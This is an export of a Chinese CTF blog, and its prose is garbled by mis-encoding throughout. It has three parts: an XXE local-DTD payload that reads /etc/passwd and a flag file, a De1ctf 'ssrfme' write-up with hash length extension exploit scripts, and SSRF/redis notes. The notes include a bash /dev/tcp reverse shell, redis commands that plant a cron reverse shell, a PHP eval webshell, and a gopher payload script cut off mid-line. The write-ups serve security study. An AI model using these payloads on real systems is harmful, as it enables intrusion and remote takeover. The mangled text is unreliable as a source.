å‘ç°æ˜¯ä¸€ä¸ªå®šæ—¶å‡½æ•°ï¼Œæ¯10ç§’postä¸€ä¸ªxmlå®ä½“ã€‚æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹</p><p>åœ¨å®ä½“éƒ¨åˆ†æ‰¾ä¸Šæ–‡çš„æœ€ç®€å•çš„ä¾‹å­ï¼Œä¸åŒ…å«ä»»ä½•è¯»æ–‡ä»¶çš„ä»£ç è¯•ä¸€ä¸‹å‘ç°è¿”å›<code>200</code>ï¼Œå†…å®¹å¼‚å¸¸è¿”å›<code>500</code>.</p><p>å¬å¤§ä½¬è¯´æ˜¯å±è”½äº†å¤–ç½‘ï¼Œä¸å…è®¸æˆ‘ä»¬è¯·æ±‚å¤–ç½‘æœåŠ¡å™¨ï¼Œåªèƒ½åˆ©ç”¨æœ¬åœ°DTDäº†ã€‚</p><p>åŸç†çœ‹<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" title="è¿™é‡Œ" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><p>è¯»å®Œå¤§æ„å°±æ˜¯å¦‚æœæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå†…éƒ¨çš„DTDï¼Œæˆ‘ä»¬å¯ä»¥å¼ºåˆ¶åœ¨ç›®æ ‡ä¸»æœºä¸Šè°ƒç”¨è¿™ä¸ªæœ¬åœ°dtdæ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­é‡å†™ä¸Šä¸€æ­¥æˆ‘ä»¬åœ¨å†…éƒ¨DTDä¸­æ‰¾åˆ°çš„å‚æ•°ã€‚å¦‚æœæˆ‘ä»¬å®šä¹‰äº†ä¸¤ä¸ªåŒåå®ä½“ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªä¼šè¢«æ‰§è¡Œã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é‡å†™çš„æœ¬åœ°DTDæ–‡ä»¶è§¦å‘æŠ¥é”™æ¥è¯»æˆ‘ä»¬çš„ç›®æ ‡æ–‡ä»¶å†…å®¹ã€‚</p><p>like this</p><pre><code>Request&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;    &lt;!ENTITY % condition &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;any text&lt;/message&gt;    Responsejava.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/usr/bin/nologindaemon:x:2:2:daemon:/:/usr/bin/nologin(No such file or directory)</code></pre><p>Contents of sip-app_1_0.dtd</p><pre><code>â€¦&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;&lt;!ELEMENT pattern (%condition;)&gt;â€¦</code></pre><p>è¿™é‡Œä½¿ç”¨ä¸‰å±‚çš„å®ä½“åµŒå¥—ï¼Œç¬¬äºŒå±‚ä¸­æˆ‘ä»¬ç»™å®šä¹‰å‚æ•°å®ä½“çš„<code>%</code>è¿›è¡Œç¼–ç ï¼Œç¬¬ä¸‰å±‚ä¸­å¯¹<code>ç©ºæ ¼</code>,<code>&#39;</code>,<code>&quot;</code>,<code>&amp;</code>,<code>%</code>éƒ½è¿›è¡Œäº†ç¼–ç ã€‚ä»£ç é‡Œå…ˆè°ƒç”¨<code>%local_dtd</code>ï¼Œç„¶ååœ¨å¯¹åº”çš„dtdæ–‡ä»¶ä¸­è°ƒç”¨äº†<code>% condition</code>,åœ¨<code>condition</code>å®šä¹‰çš„å®ä½“ä¸­è°ƒç”¨<code>eval</code>å’Œ<code>error</code>ã€‚åœ¨<code>error</code>çš„æœ€åæˆ‘ä»¬è°ƒç”¨<code>%file</code>æ¥è·å–æ–‡ä»¶å†…å®¹ã€‚ä¸ºä»€ä¹ˆä¸ä½¿ç”¨ä¸¤å±‚åµŒå¥—çš„åŸå› æ˜¯ä¼šæŠ¥é”™<code>PEReferences forbidden in internal subset in Entity</code>æŒ‡çš„æ˜¯å‚æ•°å®ä½“å¼•ç”¨(Parameter Entity Reference)ï¼Œç¦æ­¢åœ¨å†…éƒ¨Entityä¸­å¼•ç”¨å‚æ•°å®ä½“ã€‚</p><p>äºæ˜¯æˆ‘ä»¬<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" title="ä¾æ®æ­¤" target="_blank" rel="noopener">ä¾æ®æ­¤</a>æ‰¾åˆ°ä¸€ä¸ªdtdæ–‡ä»¶æ¥åˆ©ç”¨ï¼Œè¿™ä¸ª<code>fonts.dtd</code>åˆšå¥½æ˜¯<code>tomcat:8-jre8</code> é‡Œæœ‰çš„</p><pre><code>&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!ENTITY % expr &apos;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&apos;&gt;    %local_dtd;]&gt;&lt;message&gt;&lt;/message&gt;</code></pre><p>äºæ˜¯æˆ‘ä»¬é€šè¿‡æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯å¾—åˆ°äº†flag</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a><br><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1ctf</title>
      <link href="/2019/08/16/De1ctf/"/>
      <url>/2019/08/16/De1ctf/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡æ¯”èµ›çœŸçš„è¶…æœ‰æ„æ€çš„ï¼æˆ‘è¶…çº§å–œæ¬¢çš„ï¼åšäº†åŠå¤©å•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹ç€é‚£ä¸ªæ¨±èŠ±ğŸŒ¸å…¨ç¨‹é™¶é†‰~</p><a id="more"></a><h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>æºç  </p><pre><code>#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&apos;latin1&apos;)app = Flask(__name__)secert_key = os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)    def Exec(self):        result = {}        result[&apos;code&apos;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)                resp = scan(self.param)                if (resp == &quot;Connection Timeout&quot;):                    result[&apos;data&apos;] = resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&apos;code&apos;] = 200            if &quot;read&quot; in self.action:                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)                result[&apos;code&apos;] = 200                result[&apos;data&apos;] = f.read()            if result[&apos;code&apos;] == 500:                result[&apos;data&apos;] = &quot;Action Error&quot;        else:            result[&apos;code&apos;] = 500            result[&apos;msg&apos;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&apos;/&apos;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check=param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &apos;__main__&apos;:    app.debug = False    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p><code>Exec()</code>å‡½æ•°é¦–å…ˆè°ƒç”¨<code>checkSign()</code>è¿›è¡Œmd5æ ¡éªŒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ç»•è¿‡ã€‚æ¥ä¸‹æ¥å¯¹scanè¡Œä¸ºè¿›è¡Œæ‰“å¼€æ–‡æœ¬æ–‡ä»¶ï¼Œè°ƒç”¨<code>scan()</code>è¯»å–å†…å®¹ï¼Œç„¶åå°†ç›®æ ‡æ–‡ä»¶å†…å®¹å†™å…¥æ–‡ä»¶ã€‚å¯¹readè¡Œä¸ºè¿›è¡Œåˆšåˆšå†™å…¥æ–‡ä»¶çš„è¯»å–ã€‚</p><pre><code>def Exec(self):    result = {}    result[&apos;code&apos;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&apos;data&apos;] = resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&apos;code&apos;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)            result[&apos;code&apos;] = 200            result[&apos;data&apos;] = f.read()        if result[&apos;code&apos;] == 500:            result[&apos;data&apos;] = &quot;Action Error&quot;    else:        result[&apos;code&apos;] = 500        result[&apos;msg&apos;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False</code></pre><p><code>/geneSign</code>è·¯ç”±è´Ÿè´£ç”ŸæˆSignã€‚åŒæ—¶<code>action</code>è¢«é™å®šä¸º<code>scan</code></p><pre><code>#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)</code></pre><p><code>/De1ta</code>è·¯ç”±å¯¹è¯·æ±‚çš„<code>param</code>å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œç„¶åé€šè¿‡å¯¹<code>Task</code>ç±»ä¼ å…¥ç›¸åº”å‚æ•°æ‰“å°<code>Exec()</code>å‡½æ•°çš„ç»“æœ</p><pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>å‡½æ•°æ‰“å¼€<code>param</code>æŒ‡å‘çš„å†…å®¹è¿›è¡Œè¯»å–ï¼Œè¿™æ˜¯æˆ‘ä»¬åˆ©ç”¨<code>ssrf</code>çš„ç‚¹ã€‚</p><pre><code>def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;</code></pre><p>getSign()å‡½æ•°å¯¹<code>secerty_key,param,action</code>è¿›è¡Œmd5åŠ å¯†ã€‚</p><pre><code>def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>ä»£ç çš„é€»è¾‘å¤§ä½“ä¸Šæ˜¯</p><pre><code>åˆå§‹åŒ–å„ä¸ªå‚æ•°-&gt;è¿›å…¥Taskç±»-&gt;æ‰§è¡ŒExec()å‡½æ•°-&gt;æ£€æŸ¥md5å€¼-&gt;å¯¹å‚æ•°ä¸­çš„actionè¿›è¡Œä¸åŒæ“ä½œ-&gt;dumpå‡½æ•°æ‰§è¡Œç»“æœ</code></pre><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡é•¿åº¦æ‰©å±•æ”»å‡»ç»•è¿‡é•¿åº¦åˆ¤æ–­ï¼Œæ ¹æ®æç¤ºflagåœ¨<code>/flag.txt</code>ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯<code>waf()</code>å¯¹<code>gopher</code>å’Œ<code>file</code>è¿›è¡Œè¿‡æ»¤ï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨è¿™ä¸¤ä¸ªåè®®ï¼Œæ ¹æ®CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>local_file:///flag.txt</code>æ¥ç»•è¿‡wafã€‚</p><h3 id="ç¼–å†™è„šæœ¬"><a href="#ç¼–å†™è„šæœ¬" class="headerlink" title="ç¼–å†™è„šæœ¬"></a>ç¼–å†™è„šæœ¬</h3><pre><code>import urllib,hashpumpy import requests&quot;&quot;&quot;    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&quot;&quot;&quot;url = &quot;http://139.180.128.86/&quot;#get the Sign of ScangeneSign = &quot;geneSign?&quot;payload = &quot;local_file:flag.txt&quot;re = requests.get(url+geneSign+&quot;param=&quot;+payload).textprint re#hash extend attackhashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)print hashsaction = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;cookie = {    #&quot;action&quot;:urllib.quote(hashextend),    &quot;action&quot;:action,        &quot;sign&quot;:hashs}print cookiere2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)print re2.content</code></pre><p>åœ¨ä½¿ç”¨æ‰©å±•æ”»å‡»çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æŠŠæ‰€å¾—ç­¾åå‰é¢çš„ä¿¡æ¯å»æ‰</p><pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ceInput Data: local_file:flag.txtscanInput Key Length: 16Input Data to Add: read636d649a50e61e75436cc1ba50d5a003local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>åœ¨ctf timeä¸Šçœ‹åˆ°çš„å›ç­”ï¼Œåˆ†æçš„å¥½ç»†è‡´<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>ã€‚è¿™é‡Œæä¾›äº†å¦ä¸€ç§æ€è·¯</p><blockquote><p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including â€œreadâ€. If we can generate a sign for the action as â€œreadscanâ€, we can perform the scan and read the result in one go.</p><p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as â€œflag.txtreadâ€ (the value of action will be â€œscanâ€) and generate the same hash as if we pass param as â€œflag.txtâ€ and action as â€œreadscanâ€.</p><p>â€œflag.txtreadâ€+â€scanâ€ == â€œflag.txtâ€+â€readscanâ€</p><p>You could also use a length extension attack, but this way is more simple.</p><p>So our exploit is complete.</p></blockquote><p>è¿™æ˜¯ä»–ä»¬ç¼–å†™çš„è„šæœ¬ï¼šè†œ</p><pre><code>import requestsdef geneSign(param):    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).textrealParam = &quot;flag.txt&quot;param = realParam+&quot;read&quot;sign = geneSign(param)param = realParamaction = &quot;readscan&quot;answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).textprint(answer)</code></pre>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redisä¸ssrf</title>
      <link href="/2019/08/16/SSRF/"/>
      <url>/2019/08/16/SSRF/</url>
      
        <content type="html"><![CDATA[<p>SSRFç•™å‘ï¼Œæ²¡æ•´ç†å®Œã€‚æˆ‘çœŸæ˜¯ä¸ªå°èœé¸¡~</p><a id="more"></a><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h3><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h3><h1 id="ç»•è¿‡IPé™åˆ¶"><a href="#ç»•è¿‡IPé™åˆ¶" class="headerlink" title="ç»•è¿‡IPé™åˆ¶"></a>ç»•è¿‡IPé™åˆ¶</h1><ul><li>æ·»åŠ ç«¯å£ 127.0.0.1:80</li><li>çŸ­ç½‘å€ <a href="http://sina.lt/" title="çŸ­ç½‘å€" target="_blank" rel="noopener">http://sina.lt/</a></li><li>æŒ‡å‘ä»»æ„IPçš„åŸŸå <a href="xip.io">xip.io</a></li><li>è¿›åˆ¶è½¬æ¢ï¼Œç‚¹åˆ†åè¿›åˆ¶ï¼Œå…«è¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ï¼Œä¸åŒè¿›åˆ¶ç»„åˆ</li></ul><h2 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h2><p>ç»“åˆ<code>dict://  file://  gopher://</code></p><pre><code>http://www.baidu.com@127.0.0.1</code></pre><h1 id="Gopheråè®®"><a href="#Gopheråè®®" class="headerlink" title="Gopheråè®®"></a>Gopheråè®®</h1><h2 id="å®šæ—¶ä»»åŠ¡å†™shell"><a href="#å®šæ—¶ä»»åŠ¡å†™shell" class="headerlink" title="å®šæ—¶ä»»åŠ¡å†™shell"></a>å®šæ—¶ä»»åŠ¡å†™shell</h2><p>crontab æ ¼å¼ <a href="https://www.jb51.net/LINUXjishu/19905.html" title="å‚æ•°è§£é‡Š" target="_blank" rel="noopener">https://www.jb51.net/LINUXjishu/19905.html</a></p><p>åå¼¹shell </p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</code></pre><p>åˆ©ç”¨rediså†™å…¥</p><pre><code>root@kali:~# cd redis-2.8.3/root@kali:~/redis-2.8.3# cd srcroot@kali:~/redis-2.8.3/src# ./redis-cli127.0.0.1:6379&gt; * * /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2444 0&gt;&amp;1\n&quot;OK127.0.0.1:6379&gt; config set dir /var/spool/cronOK127.0.0.1:6379&gt; config set dbfilename rootOK127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt; quit</code></pre><h1 id="ä½¿ç”¨å·¥å…·æ— è„‘ç”Ÿæˆpayload"><a href="#ä½¿ç”¨å·¥å…·æ— è„‘ç”Ÿæˆpayload" class="headerlink" title="ä½¿ç”¨å·¥å…·æ— è„‘ç”Ÿæˆpayload"></a>ä½¿ç”¨å·¥å…·æ— è„‘ç”Ÿæˆpayload</h1><p>å…ˆä½¿ç”¨<code>./sniffer -p6379</code> ç›‘å¬ç½‘å¡ï¼Œç„¶ååœ¨æœ¬åœ°redisæœåŠ¡ä¸­ä½¿ç”¨å‘½ä»¤ï¼Œéšåæ–­å¼€ï¼Œsnifferä¼šæ‰“å°å‡º<code>payload</code></p><p>æˆ‘ä»¬åªè¦åŠ ä¸Š<code>curl &#39;gopher://127.0.0.1:6379/_payload&#39;</code>å³å¯</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><blockquote><p><a href="https://xz.aliyun.com/t/5844#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5844#toc-3</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redisä¸ssrf</title>
      <link href="/2019/08/10/redis/"/>
      <url>/2019/08/10/redis/</url>
      
        <content type="html"><![CDATA[<p>wula!<br>æˆ‘çˆ±å­¦ä¹ ï¼ğŸ¤«</p><a id="more"></a><h1 id="redisåè®®åˆ†æ"><a href="#redisåè®®åˆ†æ" class="headerlink" title="redisåè®®åˆ†æ"></a>redisåè®®åˆ†æ</h1><p>tcpdumpæŠ“åŒ…</p><pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>åœ¨redisæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><pre><code>127.0.0.1:6379&gt; set name testOK127.0.0.1:6379&gt; get name&quot;test&quot;127.0.0.1:6379&gt; </code></pre><h2 id="RESPåè®®"><a href="#RESPåè®®" class="headerlink" title="RESPåè®®"></a>RESPåè®®</h2><p>RESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚-å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹</p><pre><code>1. å®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸º`Bulk Strings`çš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚2. æœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚</code></pre><p>åœ¨RESPä¸­ã€‚æŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š</p><ol><li>å¯¹äº<code>Simple Strings</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯+</li><li>å¯¹äº<code>error</code>,å›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯-</li><li>å¯¹äº<code>Integer</code>,ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯:</li><li>å¯¹äº<code>Bulk Strings</code>,å›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯$</li><li>å¯¹äº<code>array</code>,å›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯*</li><li>æ­¤å¤–ï¼Œrespèƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„<code>Bulk Strings</code>æˆ–<code>Array</code>çš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤º<code>Null</code>å€¼</li><li>åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥<code>&quot;\r\n&quot;(CRLF)</code>ç»“æŸ</li></ol><p>ç°åœ¨æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬æŠ“çš„åŒ…</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg" alt="æŠ“åŒ…åè®®åˆ†æ1"></p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg" alt="åè®®åˆ†æ2"></p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg" alt="åè®®åˆ†æ3"></p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg" alt="åè®®åˆ†æ4"></p><p>æ•´ä½“æ¥çœ‹ä¸€ä¸‹</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="æ•´ä¸ªé€šä¿¡è¿‡ç¨‹"></p><p>æ­£å¦‚æˆ‘ä»¬å‰é¢æ‰€è¯´çš„ï¼Œå®¢æˆ·ç«¯å‘å°†å‘½ä»¤ä½œä¸º<code>Bulk Strings</code>çš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ï¼Œç„¶åæœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ç»™å®¢æˆ·ç«¯ä¸€ç§RESPç±»å‹ã€‚</p><p>æˆ‘ä»¬å°±æ‹¿ä¸Šé¢çš„æ•°æ®åŒ…åˆ†æï¼Œé¦–å…ˆæ˜¯<code>*3</code>ï¼Œä»£è¡¨æ•°ç»„çš„é•¿åº¦ä¸º3ï¼ˆå¯ä»¥ç®€å•ç†è§£ä¸ºç”¨ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦å°†å‘½ä»¤åˆ†å‰²ä¸º[â€œsetâ€,â€nameâ€,â€testâ€]ï¼‰ï¼›<code>$4</code>ä»£è¡¨å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œ<code>0d0a</code>å³<code>\r\n</code>è¡¨ç¤ºç»“æŸç¬¦ï¼›<code>+OK</code>è¡¨ç¤ºæœåŠ¡ç«¯æ‰§è¡ŒæˆåŠŸåè¿”å›çš„å­—ç¬¦ä¸²</p><h1 id="Redisé…åˆgopheråè®®è¿›è¡ŒSSRF"><a href="#Redisé…åˆgopheråè®®è¿›è¡ŒSSRF" class="headerlink" title="Redisé…åˆgopheråè®®è¿›è¡ŒSSRF"></a>Redisé…åˆgopheråè®®è¿›è¡ŒSSRF</h1><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>èƒ½æœªæˆæƒæˆ–é€šè¿‡å¼±å£ä»¤è®¿é—®åˆ°redisæœåŠ¡å™¨</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>rediså¸¸è§SSRFæ”»å‡»æ–¹å¼å¤§æ¦‚è¿™å‡ ç§ï¼š</p><ol><li>ç»å¯¹è·¯å¾„å†™webshell</li><li>å†™sshå…¬é’¥</li><li>å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</li></ol><h3 id="ç»å¯¹è·¯å¾„å†™webshell"><a href="#ç»å¯¹è·¯å¾„å†™webshell" class="headerlink" title="ç»å¯¹è·¯å¾„å†™webshell"></a>ç»å¯¹è·¯å¾„å†™webshell</h3><p>æ„é€ rediså‘½ä»¤</p><pre><code>flushallset 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;config set dir /var/www/htmlconfig set dbfilename shell.phpsave</code></pre><p>è½¬æ¢ä¸ºredis RESPæ ¼å¼</p><pre><code>import urllibprotocol=&quot;gopher://&quot;ip=&quot;192.168.163.128&quot;port=&quot;6379&quot;shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;,     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),     &quot;config set dir {}&quot;.format(path),     &quot;config 